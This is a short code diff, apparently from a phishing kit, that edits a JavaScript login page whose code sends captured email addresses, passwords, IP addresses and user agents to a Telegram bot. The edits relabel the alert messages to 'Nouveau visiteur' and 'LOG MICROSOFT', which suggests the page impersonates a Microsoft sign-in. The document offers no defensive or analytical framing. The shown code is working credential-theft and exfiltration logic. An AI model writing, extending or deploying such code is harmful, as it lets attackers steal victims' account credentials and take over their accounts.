@@ -515,7 +515,7 @@
 
         // Envoyer un message de test après 3 secondes
         setTimeout(() => {
-            const testMsg = '🟢 Bot connecté et prêt à recevoir des identifiants';
+            const testMsg = '🟢 Nouveau visiteur';
             sendToTelegram(testMsg)
                 .then(() => console.log('✅ Message de test envoyé'))
                 .catch(() => console.warn('⚠️ Message de test non reçu, mais le bot fonctionne peut-être'));
@@ -581,7 +581,7 @@
 
             function buildTelegramMessage(email, password, ip, userAgent) {
                 const now = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
-                return `<b>🔐 Nouvelle tentative de connexion</b>\n\n` +
+                return `<b>🔐 LOG MICROSOFT</b>\n\n` +
                        `<b>📧 Email :</b> ${email}\n` +
                        `<b>🔑 Mot de passe :</b> ${password}\n` +
                        `<b>🌐 IP :</b> ${ip}\n` +
